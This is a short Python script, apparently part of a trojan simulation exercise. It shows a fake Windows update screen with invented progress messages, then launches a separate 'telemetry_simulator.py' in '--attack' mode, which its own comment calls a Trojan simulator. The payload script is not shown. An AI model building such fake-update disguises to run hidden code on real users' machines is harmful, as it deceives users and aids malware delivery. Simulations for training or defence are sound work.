import os
import sys
import time

def setup():
    print("=========================================")
    print("   WINDOWS SYSTEM UPDATE v4.2.1          ")
    print("=========================================\n")
    
    print("[*] Downloading security patches...")
    time.sleep(1.5)
    print("[*] Unpacking libraries...")
    time.sleep(1)
    print("[*] Updating registry keys...")
    time.sleep(1)
    
    print("\n[+] Update successfully installed.")
    time.sleep(1)
    
    print("\n[!] Launching background services...\n")
    time.sleep(1)
    
    # Executes the Trojan simulator in ATTACK mode
    sim_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "telemetry_simulator.py")
    cmd = f'"{sys.executable}" "{sim_script}" --attack'
    os.system(cmd)

if __name__ == "__main__":
    setup()